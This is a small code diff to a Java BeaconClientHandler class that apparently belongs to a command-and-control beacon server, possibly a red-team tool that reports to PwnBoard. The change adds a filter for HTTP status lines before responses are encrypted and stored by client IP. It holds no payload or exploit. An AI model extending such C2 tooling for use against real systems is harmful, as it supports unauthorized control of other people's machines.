@@ -152,7 +152,7 @@ public class BeaconClientHandler implements Runnable{
             try{
                 String response = duplexer.receive();
                 sendPwnBoardRequest();
-                if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.isBlank())){
+                if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.equals("HTTP/1.1 200 OK")) && !(response.isBlank())){
                     response = encrypt(response);
                     if(!(response.equals("KEEP_ALIVE"))){
                         beaconServer.addDataToResponsesDictionaries(IPAddress, response);
